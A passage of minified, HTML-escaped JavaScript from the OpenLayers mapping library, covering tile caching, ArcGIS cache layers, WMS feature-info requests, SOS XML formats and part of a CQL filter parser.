b&#125;,CLASS_NAME:"OpenLayers.Layer.UTFGrid"&#125;);OpenLayers.TileManager=OpenLayers.Class(&#123;cacheSize:256,tilesPerFrame:2,frameDelay:16,moveDelay:100,zoomDelay:200,maps:null,tileQueueId:null,tileQueue:null,tileCache:null,tileCacheIndex:null,initialize:function(a)&#123;OpenLayers.Util.extend(this,a);this.maps=[];this.tileQueueId=&#123;&#125;;this.tileQueue=&#123;&#125;;this.tileCache=&#123;&#125;;this.tileCacheIndex=[]&#125;,addMap:function(a)&#123;if(!this._destroyed&amp;&amp;OpenLayers.Layer.Grid)&#123;this.maps.push(a);this.tileQueue[a.id]=[];for(var b=0,c=a.layers.length;b&lt;c;++b)this.addLayer(&#123;layer:a.layers[b]&#125;);a.events.on(&#123;move:this.move,zoomend:this.zoomEnd,changelayer:this.changeLayer,addlayer:this.addLayer,preremovelayer:this.removeLayer,scope:this&#125;)&#125;&#125;,removeMap:function(a)&#123;if(!this._destroyed&amp;&amp;OpenLayers.Layer.Grid)&#123;window.clearTimeout(this.tileQueueId[a.id]);if(a.layers)for(var b=0,c=a.layers.length;b&lt;c;++b)this.removeLayer(&#123;layer:a.layers[b]&#125;);a.events&amp;&amp;a.events.un(&#123;move:this.move,zoomend:this.zoomEnd,changelayer:this.changeLayer,addlayer:this.addLayer,preremovelayer:this.removeLayer,scope:this&#125;);delete this.tileQueue[a.id];delete this.tileQueueId[a.id];OpenLayers.Util.removeItem(this.maps,a)&#125;&#125;,move:function(a)&#123;this.updateTimeout(a.object,this.moveDelay,!0)&#125;,zoomEnd:function(a)&#123;this.updateTimeout(a.object,this.zoomDelay)&#125;,changeLayer:function(a)&#123;"visibility"!==a.property&amp;&amp;"params"!==a.property||this.updateTimeout(a.object,0)&#125;,addLayer:function(a)&#123;a=a.layer;if(a instanceof OpenLayers.Layer.Grid)&#123;a.events.on(&#123;addtile:this.addTile,retile:this.clearTileQueue,scope:this&#125;);var b,c,d;for(b=a.grid.length-1;0&lt;=b;--b)for(c=a.grid[b].length-1;0&lt;=c;--c)d=a.grid[b][c],this.addTile(&#123;tile:d&#125;),d.url&amp;&amp;!d.imgDiv&amp;&amp;this.manageTileCache(&#123;object:d&#125;)&#125;&#125;,removeLayer:function(a)&#123;a=a.layer;if(a instanceof OpenLayers.Layer.Grid&amp;&amp;(this.clearTileQueue(&#123;object:a&#125;),a.events&amp;&amp;a.events.un(&#123;addtile:this.addTile,retile:this.clearTileQueue,scope:this&#125;),a.grid))&#123;var b,c,d;for(b=a.grid.length-1;0&lt;=b;--b)for(c=a.grid[b].length-1;0&lt;=c;--c)d=a.grid[b][c],this.unloadTile(&#123;object:d&#125;)&#125;&#125;,updateTimeout:function(a,b,c)&#123;window.clearTimeout(this.tileQueueId[a.id]);var d=this.tileQueue[a.id];if(!c||d.length)this.tileQueueId[a.id]=window.setTimeout(OpenLayers.Function.bind(function()&#123;this.drawTilesFromQueue(a);d.length&amp;&amp;this.updateTimeout(a,this.frameDelay)&#125;,this),b)&#125;,addTile:function(a)&#123;if(a.tile instanceof OpenLayers.Tile.Image)a.tile.events.on(&#123;beforedraw:this.queueTileDraw,beforeload:this.manageTileCache,loadend:this.addToCache,unload:this.unloadTile,scope:this&#125;);else this.removeLayer(&#123;layer:a.tile.layer&#125;)&#125;,unloadTile:function(a)&#123;a=a.object;a.events.un(&#123;beforedraw:this.queueTileDraw,beforeload:this.manageTileCache,loadend:this.addToCache,unload:this.unloadTile,scope:this&#125;);OpenLayers.Util.removeItem(this.tileQueue[a.layer.map.id],a)&#125;,queueTileDraw:function(a)&#123;a=a.object;var b=!1,c=a.layer,d=c.getURL(a.bounds),e=this.tileCache[d];e&amp;&amp;"olTileImage"!==e.className&amp;&amp;(delete this.tileCache[d],OpenLayers.Util.removeItem(this.tileCacheIndex,d),e=null);!c.url||!c.async&amp;&amp;e||(b=this.tileQueue[c.map.id],~OpenLayers.Util.indexOf(b,a)||b.push(a),b=!0);return!b&#125;,drawTilesFromQueue:function(a)&#123;var b=this.tileQueue[a.id],c=this.tilesPerFrame;for(a=a.zoomTween&amp;&amp;a.zoomTween.playing;!a&amp;&amp;b.length&amp;&amp;c;)b.shift().draw(!0),--c&#125;,manageTileCache:function(a)&#123;a=a.object;var b=this.tileCache[a.url];b&amp;&amp;(b.parentNode&amp;&amp;OpenLayers.Element.hasClass(b.parentNode,"olBackBuffer")&amp;&amp;(b.parentNode.removeChild(b),b.id=null),b.parentNode||(b.style.visibility="hidden",b.style.opacity=0,a.setImage(b),OpenLayers.Util.removeItem(this.tileCacheIndex,a.url),this.tileCacheIndex.push(a.url)))&#125;,addToCache:function(a)&#123;a=a.object;this.tileCache[a.url]||OpenLayers.Element.hasClass(a.imgDiv,"olImageLoadError")||(this.tileCacheIndex.length&gt;=this.cacheSize&amp;&amp;(delete this.tileCache[this.tileCacheIndex[0]],this.tileCacheIndex.shift()),this.tileCache[a.url]=a.imgDiv,this.tileCacheIndex.push(a.url))&#125;,clearTileQueue:function(a)&#123;a=a.object;for(var b=this.tileQueue[a.map.id],c=b.length-1;0&lt;=c;--c)b[c].layer===a&amp;&amp;b.splice(c,1)&#125;,destroy:function()&#123;for(var a=this.maps.length-1;0&lt;=a;--a)this.removeMap(this.maps[a]);this.tileCacheIndex=this.tileCache=this.tileQueueId=this.tileQueue=this.maps=null;this._destroyed=!0&#125;&#125;);OpenLayers.Layer.ArcGISCache=OpenLayers.Class(OpenLayers.Layer.XYZ,&#123;url:null,tileOrigin:null,tileSize:new OpenLayers.Size(256,256),useArcGISServer:!0,type:"png",useScales:!1,overrideDPI:!1,initialize:function(a,b,c)&#123;OpenLayers.Layer.XYZ.prototype.initialize.apply(this,arguments);this.resolutions&amp;&amp;(this.serverResolutions=this.resolutions,this.maxExtent=this.getMaxExtentForResolution(this.resolutions[0]));if(this.layerInfo)&#123;var d=this.layerInfo,e=new OpenLayers.Bounds(d.fullExtent.xmin,d.fullExtent.ymin,d.fullExtent.xmax,d.fullExtent.ymax);this.projection="EPSG:"+d.spatialReference.wkid;this.sphericalMercator=102100==d.spatialReference.wkid;this.units="esriFeet"==d.units?"ft":"m";if(d.tileInfo)&#123;this.tileSize=new OpenLayers.Size(d.tileInfo.width||d.tileInfo.cols,d.tileInfo.height||d.tileInfo.rows);this.tileOrigin=new OpenLayers.LonLat(d.tileInfo.origin.x,d.tileInfo.origin.y);var f=new OpenLayers.Geometry.Point(e.left,e.top),e=new OpenLayers.Geometry.Point(e.right,e.bottom);this.useScales?this.scales=[]:this.resolutions=[];this.lods=[];for(var g in d.tileInfo.lods)if(d.tileInfo.lods.hasOwnProperty(g))&#123;var h=d.tileInfo.lods[g];this.useScales?this.scales.push(h.scale):this.resolutions.push(h.resolution);var k=this.getContainingTileCoords(f,h.resolution);h.startTileCol=k.x;h.startTileRow=k.y;k=this.getContainingTileCoords(e,h.resolution);h.endTileCol=k.x;h.endTileRow=k.y;this.lods.push(h)&#125;this.maxExtent=this.calculateMaxExtentWithLOD(this.lods[0]);this.serverResolutions=this.resolutions;this.overrideDPI&amp;&amp;d.tileInfo.dpi&amp;&amp;(OpenLayers.DOTS_PER_INCH=d.tileInfo.dpi)&#125;&#125;&#125;,getContainingTileCoords:function(a,b)&#123;return new OpenLayers.Pixel(Math.max(Math.floor((a.x-this.tileOrigin.lon)/(this.tileSize.w*b)),0),Math.max(Math.floor((this.tileOrigin.lat-a.y)/(this.tileSize.h*b)),0))&#125;,calculateMaxExtentWithLOD:function(a)&#123;var b=this.tileOrigin.lon+a.startTileCol*this.tileSize.w*a.resolution,c=this.tileOrigin.lat-a.startTileRow*this.tileSize.h*a.resolution;return new OpenLayers.Bounds(b,c-(a.endTileRow-a.startTileRow+1)*this.tileSize.h*a.resolution,b+(a.endTileCol-a.startTileCol+1)*this.tileSize.w*a.resolution,c)&#125;,calculateMaxExtentWithExtent:function(a,b)&#123;var c=new OpenLayers.Geometry.Point(a.left,a.top),d=new OpenLayers.Geometry.Point(a.right,a.bottom),c=this.getContainingTileCoords(c,b),d=this.getContainingTileCoords(d,b);return this.calculateMaxExtentWithLOD(&#123;resolution:b,startTileCol:c.x,startTileRow:c.y,endTileCol:d.x,endTileRow:d.y&#125;)&#125;,getUpperLeftTileCoord:function(a)&#123;var b=new OpenLayers.Geometry.Point(this.maxExtent.left,this.maxExtent.top);return this.getContainingTileCoords(b,a)&#125;,getLowerRightTileCoord:function(a)&#123;var b=new OpenLayers.Geometry.Point(this.maxExtent.right,this.maxExtent.bottom);return this.getContainingTileCoords(b,a)&#125;,getMaxExtentForResolution:function(a)&#123;var b=this.getUpperLeftTileCoord(a),c=this.getLowerRightTileCoord(a),d=this.tileOrigin.lon+b.x*this.tileSize.w*a,e=this.tileOrigin.lat-b.y*this.tileSize.h*a;return new OpenLayers.Bounds(d,e-(c.y-b.y+1)*this.tileSize.h*a,d+(c.x-b.x+1)*this.tileSize.w*a,e)&#125;,clone:function(a)&#123;null==a&amp;&amp;(a=new OpenLayers.Layer.ArcGISCache(this.name,this.url,this.options));return OpenLayers.Layer.XYZ.prototype.clone.apply(this,[a])&#125;,initGriddedTiles:function(a)&#123;delete this._tileOrigin;OpenLayers.Layer.XYZ.prototype.initGriddedTiles.apply(this,arguments)&#125;,getMaxExtent:function()&#123;var a=this.map.getResolution();return this.maxExtent=this.getMaxExtentForResolution(a)&#125;,getTileOrigin:function()&#123;if(!this._tileOrigin)&#123;var a=this.getMaxExtent();this._tileOrigin=new OpenLayers.LonLat(a.left,a.bottom)&#125;return this._tileOrigin&#125;,getURL:function(a)&#123;var b=this.getResolution(),c=this.tileOrigin.lon+b*this.tileSize.w/2,d=this.tileOrigin.lat-b*this.tileSize.h/2;a=a.getCenterLonLat();c=Math.round(Math.abs((a.lon-c)/(b*this.tileSize.w)));d=Math.round(Math.abs((d-a.lat)/(b*this.tileSize.h)));a=this.map.getZoom();if(this.lods)&#123;if(b=this.lods[this.map.getZoom()],c&lt;b.startTileCol||c&gt;b.endTileCol||d&lt;b.startTileRow||d&gt;b.endTileRow)return null&#125;else&#123;var e=this.getUpperLeftTileCoord(b),b=this.getLowerRightTileCoord(b);if(c&lt;e.x||c&gt;=b.x||d&lt;e.y||d&gt;=b.y)return null&#125;b=this.url;e=""+c+d+a;OpenLayers.Util.isArray(b)&amp;&amp;(b=this.selectUrl(e,b));this.useArcGISServer?b+="/tile/$&#123;z&#125;/$&#123;y&#125;/$&#123;x&#125;":(c="C"+OpenLayers.Number.zeroPad(c,8,16),d="R"+OpenLayers.Number.zeroPad(d,8,16),a="L"+OpenLayers.Number.zeroPad(a,2,10),b=b+"/$&#123;z&#125;/$&#123;y&#125;/$&#123;x&#125;."+this.type);b=OpenLayers.String.format(b,&#123;x:c,y:d,z:a&#125;);return OpenLayers.Util.urlAppend(b,OpenLayers.Util.getParameterString(this.params))&#125;,CLASS_NAME:"OpenLayers.Layer.ArcGISCache"&#125;);OpenLayers.Control.WMSGetFeatureInfo=OpenLayers.Class(OpenLayers.Control,&#123;hover:!1,drillDown:!1,maxFeatures:10,clickCallback:"click",output:"features",layers:null,queryVisible:!1,url:null,layerUrls:null,infoFormat:"text/html",vendorParams:&#123;&#125;,format:null,formatOptions:null,handler:null,hoverRequest:null,initialize:function(a)&#123;a=a||&#123;&#125;;a.handlerOptions=a.handlerOptions||&#123;&#125;;OpenLayers.Control.prototype.initialize.apply(this,[a]);this.format||(this.format=new OpenLayers.Format.WMSGetFeatureInfo(a.formatOptions));!0===this.drillDown&amp;&amp;(this.hover=!1);this.hover?this.handler=new OpenLayers.Handler.Hover(this,&#123;move:this.cancelHover,pause:this.getInfoForHover&#125;,OpenLayers.Util.extend(this.handlerOptions.hover||&#123;&#125;,&#123;delay:250&#125;)):(a=&#123;&#125;,a[this.clickCallback]=this.getInfoForClick,this.handler=new OpenLayers.Handler.Click(this,a,this.handlerOptions.click||&#123;&#125;))&#125;,getInfoForClick:function(a)&#123;this.events.triggerEvent("beforegetfeatureinfo",&#123;xy:a.xy&#125;);OpenLayers.Element.addClass(this.map.viewPortDiv,"olCursorWait");this.request(a.xy,&#123;&#125;)&#125;,getInfoForHover:function(a)&#123;this.events.triggerEvent("beforegetfeatureinfo",&#123;xy:a.xy&#125;);this.request(a.xy,&#123;hover:!0&#125;)&#125;,cancelHover:function()&#123;this.hoverRequest&amp;&amp;(this.hoverRequest.abort(),this.hoverRequest=null)&#125;,findLayers:function()&#123;for(var a=this.layers||this.map.layers,b=[],c,d,e=a.length-1;0&lt;=e;--e)c=a[e],c instanceof OpenLayers.Layer.WMS&amp;&amp;(!this.queryVisible||c.getVisibility())&amp;&amp;(d=OpenLayers.Util.isArray(c.url)?c.url[0]:c.url,!1!==this.drillDown||this.url||(this.url=d),(!0===this.drillDown||this.urlMatches(d))&amp;&amp;b.push(c));return b&#125;,urlMatches:function(a)&#123;var b=OpenLayers.Util.isEquivalentUrl(this.url,a);if(!b&amp;&amp;this.layerUrls)for(var c=0,d=this.layerUrls.length;c&lt;d;++c)if(OpenLayers.Util.isEquivalentUrl(this.layerUrls[c],a))&#123;b=!0;break&#125;return b&#125;,buildWMSOptions:function(a,b,c,d)&#123;for(var e=[],f=[],g=0,h=b.length;g&lt;h;g++)null!=b[g].params.LAYERS&amp;&amp;(e=e.concat(b[g].params.LAYERS),f=f.concat(this.getStyleNames(b[g])));b=b[0];g=this.map.getProjection();(h=b.projection)&amp;&amp;h.equals(this.map.getProjectionObject())&amp;&amp;(g=h.getCode());d=OpenLayers.Util.extend(&#123;service:"WMS",version:b.params.VERSION,request:"GetFeatureInfo",exceptions:b.params.EXCEPTIONS,bbox:this.map.getExtent().toBBOX(null,b.reverseAxisOrder()),feature_count:this.maxFeatures,height:this.map.getSize().h,width:this.map.getSize().w,format:d,info_format:b.params.INFO_FORMAT||this.infoFormat&#125;,1.3&lt;=parseFloat(b.params.VERSION)?&#123;crs:g,i:parseInt(c.x),j:parseInt(c.y)&#125;:&#123;srs:g,x:parseInt(c.x),y:parseInt(c.y)&#125;);0!=e.length&amp;&amp;(d=OpenLayers.Util.extend(&#123;layers:e,query_layers:e,styles:f&#125;,d));OpenLayers.Util.applyDefaults(d,this.vendorParams);return&#123;url:a,params:OpenLayers.Util.upperCaseObject(d),callback:function(b)&#123;this.handleResponse(c,b,a)&#125;,scope:this&#125;&#125;,getStyleNames:function(a)&#123;return a.params.STYLES?a.params.STYLES:OpenLayers.Util.isArray(a.params.LAYERS)?Array(a.params.LAYERS.length):a.params.LAYERS.replace(/[^,]/g,"")&#125;,request:function(a,b)&#123;var c=this.findLayers();if(0==c.length)this.events.triggerEvent("nogetfeatureinfo"),OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait");else if(b=b||&#123;&#125;,!1===this.drillDown)&#123;var c=this.buildWMSOptions(this.url,c,a,c[0].params.FORMAT),d=OpenLayers.Request.GET(c);!0===b.hover&amp;&amp;(this.hoverRequest=d)&#125;else&#123;this._numRequests=this._requestCount=0;this.features=[];for(var d=&#123;&#125;,e,f=0,g=c.length;f&lt;g;f++)&#123;var h=c[f];e=OpenLayers.Util.isArray(h.url)?h.url[0]:h.url;e in d?d[e].push(h):(this._numRequests++,d[e]=[h])&#125;for(e in d)c=d[e],c=this.buildWMSOptions(e,c,a,c[0].params.FORMAT),OpenLayers.Request.GET(c)&#125;&#125;,triggerGetFeatureInfo:function(a,b,c)&#123;this.events.triggerEvent("getfeatureinfo",&#123;text:a.responseText,features:c,request:a,xy:b&#125;);OpenLayers.Element.removeClass(this.map.viewPortDiv,"olCursorWait")&#125;,handleResponse:function(a,b,c)&#123;var d=b.responseXML;d&amp;&amp;d.documentElement||(d=b.responseText);d=this.format.read(d);!1===this.drillDown?this.triggerGetFeatureInfo(b,a,d):(this._requestCount++,this._features="object"===this.output?(this._features||[]).concat(&#123;url:c,features:d&#125;):(this._features||[]).concat(d),this._requestCount===this._numRequests&amp;&amp;(this.triggerGetFeatureInfo(b,a,this._features.concat()),delete this._features,delete this._requestCount,delete this._numRequests))&#125;,CLASS_NAME:"OpenLayers.Control.WMSGetFeatureInfo"&#125;);OpenLayers.Format.WMSCapabilities.v1_3_0=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_3,&#123;version:"1.3.0",CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_3_0"&#125;);OpenLayers.Format.SOSGetFeatureOfInterest=OpenLayers.Class(OpenLayers.Format.XML,&#123;VERSION:"1.0.0",namespaces:&#123;sos:"http://www.opengis.net/sos/1.0",gml:"http://www.opengis.net/gml",sa:"http://www.opengis.net/sampling/1.0",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,schemaLocation:"http://www.opengis.net/sos/1.0 http://schemas.opengis.net/sos/1.0.0/sosAll.xsd",defaultPrefix:"sos",regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;features:[]&#125;;this.readNode(a,b);a=[];for(var c=0,d=b.features.length;c&lt;d;c++)&#123;var e=b.features[c];this.internalProjection&amp;&amp;(this.externalProjection&amp;&amp;e.components[0])&amp;&amp;e.components[0].transform(this.externalProjection,this.internalProjection);e=new OpenLayers.Feature.Vector(e.components[0],e.attributes);a.push(e)&#125;return a&#125;,readers:&#123;sa:&#123;SamplingPoint:function(a,b)&#123;if(!b.attributes)&#123;var c=&#123;attributes:&#123;&#125;&#125;;b.features.push(c);b=c&#125;b.attributes.id=this.getAttributeNS(a,this.namespaces.gml,"id");this.readChildNodes(a,b)&#125;,position:function(a,b)&#123;this.readChildNodes(a,b)&#125;&#125;,gml:OpenLayers.Util.applyDefaults(&#123;FeatureCollection:function(a,b)&#123;this.readChildNodes(a,b)&#125;,featureMember:function(a,b)&#123;var c=&#123;attributes:&#123;&#125;&#125;;b.features.push(c);this.readChildNodes(a,c)&#125;,name:function(a,b)&#123;b.attributes.name=this.getChildValue(a)&#125;,pos:function(a,b)&#123;this.externalProjection||(this.externalProjection=new OpenLayers.Projection(a.getAttribute("srsName")));OpenLayers.Format.GML.v3.prototype.readers.gml.pos.apply(this,[a,b])&#125;&#125;,OpenLayers.Format.GML.v3.prototype.readers.gml)&#125;,writers:&#123;sos:&#123;GetFeatureOfInterest:function(a)&#123;for(var b=this.createElementNSPlus("GetFeatureOfInterest",&#123;attributes:&#123;version:this.VERSION,service:"SOS","xsi:schemaLocation":this.schemaLocation&#125;&#125;),c=0,d=a.fois.length;c&lt;d;c++)this.writeNode("FeatureOfInterestId",&#123;foi:a.fois[c]&#125;,b);return b&#125;,FeatureOfInterestId:function(a)&#123;return this.createElementNSPlus("FeatureOfInterestId",&#123;value:a.foi&#125;)&#125;&#125;&#125;,CLASS_NAME:"OpenLayers.Format.SOSGetFeatureOfInterest"&#125;);OpenLayers.Format.SOSGetObservation=OpenLayers.Class(OpenLayers.Format.XML,&#123;namespaces:&#123;ows:"http://www.opengis.net/ows",gml:"http://www.opengis.net/gml",sos:"http://www.opengis.net/sos/1.0",ogc:"http://www.opengis.net/ogc",om:"http://www.opengis.net/om/1.0",sa:"http://www.opengis.net/sampling/1.0",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"&#125;,regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,VERSION:"1.0.0",schemaLocation:"http://www.opengis.net/sos/1.0 http://schemas.opengis.net/sos/1.0.0/sosGetObservation.xsd",defaultPrefix:"sos",read:function(a)&#123;"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b=&#123;measurements:[],observations:[]&#125;;this.readNode(a,b);return b&#125;,write:function(a)&#123;a=this.writeNode("sos:GetObservation",a);a.setAttribute("xmlns:om",this.namespaces.om);a.setAttribute("xmlns:ogc",this.namespaces.ogc);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])&#125;,readers:&#123;om:&#123;ObservationCollection:function(a,b)&#123;b.id=this.getAttributeNS(a,this.namespaces.gml,"id");this.readChildNodes(a,b)&#125;,member:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Measurement:function(a,b)&#123;var c=&#123;&#125;;b.measurements.push(c);this.readChildNodes(a,c)&#125;,Observation:function(a,b)&#123;var c=&#123;&#125;;b.observations.push(c);this.readChildNodes(a,c)&#125;,samplingTime:function(a,b)&#123;var c=&#123;&#125;;b.samplingTime=c;this.readChildNodes(a,c)&#125;,observedProperty:function(a,b)&#123;b.observedProperty=this.getAttributeNS(a,this.namespaces.xlink,"href");this.readChildNodes(a,b)&#125;,procedure:function(a,b)&#123;b.procedure=this.getAttributeNS(a,this.namespaces.xlink,"href");this.readChildNodes(a,b)&#125;,featureOfInterest:function(a,b)&#123;var c=&#123;features:[]&#125;;b.fois=[];b.fois.push(c);this.readChildNodes(a,c);for(var d=[],e=0,f=c.features.length;e&lt;f;e++)&#123;var g=c.features[e];d.push(new OpenLayers.Feature.Vector(g.components[0],g.attributes))&#125;c.features=d&#125;,result:function(a,b)&#123;var c=&#123;&#125;;b.result=c;""!==this.getChildValue(a)?(c.value=this.getChildValue(a),c.uom=a.getAttribute("uom")):this.readChildNodes(a,c)&#125;&#125;,sa:OpenLayers.Format.SOSGetFeatureOfInterest.prototype.readers.sa,gml:OpenLayers.Util.applyDefaults(&#123;TimeInstant:function(a,b)&#123;var c=&#123;&#125;;b.timeInstant=c;this.readChildNodes(a,c)&#125;,timePosition:function(a,b)&#123;b.timePosition=this.getChildValue(a)&#125;&#125;,OpenLayers.Format.SOSGetFeatureOfInterest.prototype.readers.gml)&#125;,writers:&#123;sos:&#123;GetObservation:function(a)&#123;var b=this.createElementNSPlus("GetObservation",&#123;attributes:&#123;version:this.VERSION,service:"SOS"&#125;&#125;);this.writeNode("offering",a,b);a.eventTime&amp;&amp;this.writeNode("eventTime",a,b);for(var c in a.procedures)this.writeNode("procedure",a.procedures[c],b);for(var d in a.observedProperties)this.writeNode("observedProperty",a.observedProperties[d],b);a.foi&amp;&amp;this.writeNode("featureOfInterest",a.foi,b);this.writeNode("responseFormat",a,b);a.resultModel&amp;&amp;this.writeNode("resultModel",a,b);a.responseMode&amp;&amp;this.writeNode("responseMode",a,b);return b&#125;,featureOfInterest:function(a)&#123;var b=this.createElementNSPlus("featureOfInterest");this.writeNode("ObjectID",a.objectId,b);return b&#125;,ObjectID:function(a)&#123;return this.createElementNSPlus("ObjectID",&#123;value:a&#125;)&#125;,responseFormat:function(a)&#123;return this.createElementNSPlus("responseFormat",&#123;value:a.responseFormat&#125;)&#125;,procedure:function(a)&#123;return this.createElementNSPlus("procedure",&#123;value:a&#125;)&#125;,offering:function(a)&#123;return this.createElementNSPlus("offering",&#123;value:a.offering&#125;)&#125;,observedProperty:function(a)&#123;return this.createElementNSPlus("observedProperty",&#123;value:a&#125;)&#125;,eventTime:function(a)&#123;var b=this.createElementNSPlus("eventTime");"latest"===a.eventTime&amp;&amp;this.writeNode("ogc:TM_Equals",a,b);return b&#125;,resultModel:function(a)&#123;return this.createElementNSPlus("resultModel",&#123;value:a.resultModel&#125;)&#125;,responseMode:function(a)&#123;return this.createElementNSPlus("responseMode",&#123;value:a.responseMode&#125;)&#125;&#125;,ogc:&#123;TM_Equals:function(a)&#123;var b=this.createElementNSPlus("ogc:TM_Equals");this.writeNode("ogc:PropertyName",&#123;property:"urn:ogc:data:time:iso8601"&#125;,b);"latest"===a.eventTime&amp;&amp;this.writeNode("gml:TimeInstant",&#123;value:"latest"&#125;,b);return b&#125;,PropertyName:function(a)&#123;return this.createElementNSPlus("ogc:PropertyName",&#123;value:a.property&#125;)&#125;&#125;,gml:&#123;TimeInstant:function(a)&#123;var b=this.createElementNSPlus("gml:TimeInstant");this.writeNode("gml:timePosition",a,b);return b&#125;,timePosition:function(a)&#123;return this.createElementNSPlus("gml:timePosition",&#123;value:a.value&#125;)&#125;&#125;&#125;,CLASS_NAME:"OpenLayers.Format.SOSGetObservation"&#125;);OpenLayers.Control.UTFGrid=OpenLayers.Class(OpenLayers.Control,&#123;autoActivate:!0,layers:null,defaultHandlerOptions:&#123;delay:300,pixelTolerance:4,stopMove:!1,single:!0,"double":!1,stopSingle:!1,stopDouble:!1&#125;,handlerMode:"click",setHandler:function(a)&#123;this.handlerMode=a;this.resetHandler()&#125;,resetHandler:function()&#123;this.handler&amp;&amp;(this.handler.deactivate(),this.handler.destroy(),this.handler=null);"hover"==this.handlerMode?this.handler=new OpenLayers.Handler.Hover(this,&#123;pause:this.handleEvent,move:this.reset&#125;,this.handlerOptions):"click"==this.handlerMode?this.handler=new OpenLayers.Handler.Click(this,&#123;click:this.handleEvent&#125;,this.handlerOptions):"move"==this.handlerMode&amp;&amp;(this.handler=new OpenLayers.Handler.Hover(this,&#123;pause:this.handleEvent,move:this.handleEvent&#125;,this.handlerOptions));return this.handler?!0:!1&#125;,initialize:function(a)&#123;a=a||&#123;&#125;;a.handlerOptions=a.handlerOptions||this.defaultHandlerOptions;OpenLayers.Control.prototype.initialize.apply(this,[a]);this.resetHandler()&#125;,handleEvent:function(a)&#123;if(null==a)this.reset();else&#123;var b=this.map.getLonLatFromPixel(a.xy);if(b)&#123;var c=this.findLayers();if(0&lt;c.length)&#123;for(var d=&#123;&#125;,e,f,g=0,h=c.length;g&lt;h;g++)e=c[g],f=OpenLayers.Util.indexOf(this.map.layers,e),d[f]=e.getFeatureInfo(b);this.callback(d,b,a.xy)&#125;&#125;&#125;&#125;,callback:function(a)&#123;&#125;,reset:function(a)&#123;this.callback(null)&#125;,findLayers:function()&#123;for(var a=this.layers||this.map.layers,b=[],c,d=a.length-1;0&lt;=d;--d)c=a[d],c instanceof OpenLayers.Layer.UTFGrid&amp;&amp;b.push(c);return b&#125;,CLASS_NAME:"OpenLayers.Control.UTFGrid"&#125;);OpenLayers.Format.CQL=function()&#123;function a(a)&#123;function b()&#123;var a=e.pop();switch(a.type)&#123;case "LOGICAL":var c=b(),g=b();return new OpenLayers.Filter.Logical(&#123;filters:[g,c],type:f[a.text.toUpperCase()]&#125;);case "NOT":return a=b(),new OpenLayers.Filter.Logical(&#123;filters:[a],type:OpenLayers.Filter.Logical.NOT&#125;);case "BETWEEN":return e.pop(),g=b(),a=b(),c=b(),new OpenLayers.Filter.Comparison(&#123;property:c,lowerBoundary:a,upperBoundary:g,type:OpenLayers.Filter.Comparison.BETWEEN&#125;);case "COMPARISON":return g=b(),c=b(),new OpenLayers.Filter.Comparison(&#123;property:c,value:g,type:d[a.text.toUpperCase()]&#125;);case "IS_NULL":return c=b(),new OpenLayers.Filter.Comparison(&#123;property:c,type:d[a.text.toUpperCase()]&#125;);case "VALUE":return(c=a.text.match(/^'(.*)'$/))?c[1].replace(/''/g,"'"):Number(a.text);case "SPATIAL":switch(a.text.toUpperCase())&#123;case "BBOX":var a=b(),c=b(),g=b(),h=b(),k=b();return new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.BBOX,property:k,value:OpenLayers.Bounds.fromArray([h,g,c,a])&#125;);case "INTERSECTS":return g=b(),c=b(),new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.INTERSECTS,property:c,value:g&#125;);case "WITHIN":return g=b(),c=b(),new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.WITHIN,property:c,value:g&#125;);case "CONTAINS":return g=b(),c=b(),new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.CONTAINS,property:c,value:g&#125;);case "DWITHIN":return a=b(),g=b(),c=b(),new OpenLayers.Filter.Spatial(&#123;type:OpenLayers.Filter.Spatial.DWITHIN,value:g,property:c,distance:Number(a)&#125;)&#125;case "GEOMETRY":return OpenLayers.Geometry.fromWKT(a.text);default:return a.text&#125;&#125;for(var c=[],e=[];a.length;)&#123;var g=a.shift();switch(g.type)&#123;case "PROPERTY":case "GEOMETRY":case "VALUE":e.push(g);break;case "COMPARISON":case "BETWEEN":case "IS_NULL":case "LOGICAL":for(var k=h[g.type];0&lt;c.length&amp;&amp;h[c[c.length-1].type]&lt;=k;)e.push(c.pop());c.push(g);break;case "SPATIAL":case "NOT":case "LPAREN":c.push(g);break;case "RPAREN":for(;0&lt;c.length&amp;&amp;"LPAREN"!=c[c.length-1].type;)e.push(c.pop());c.pop();0&lt;c.length&amp;&amp;"SPATIAL"==c[c.length-1].type&amp;&amp;e.push(c.pop());case "COMMA":case "END":break;default:throw Error("Unknown token type "+g.type);&#125;&#125;for(;0&lt;c.length;)e.push(c.pop());a=b();if(0&lt;e.length)&#123;a="Remaining tokens after building AST: \n";for(c=e.length-1;0&lt;=c;c--)a+=e[c].type+": "+e[c].text+"\n";throw Error(a);&#125;return a&#125;var b=&#123;PROPERTY:/^[_a-zA-Z]\w*/,COMPARISON:/^(=|&lt;&gt;|&lt;=|&lt;|&gt;=|&gt;|LIKE)/i,IS_NULL:/^IS NULL/i,COMMA:/^,/,LOGICAL:/^(AND|OR)/i,VALUE:/^('([^']|'')*'|\d+(\.\d*)?|\.\d+)/,LPAREN:/^\(/,RPAREN:/^\)/,SPATIAL:/^(BBOX|INTERSECTS|DWITHIN|WITHIN|CONTAINS)/i,NOT:/^NOT/i,BETWEEN:/^BETWEEN/i,GEOMETRY:function(a)&#123;var 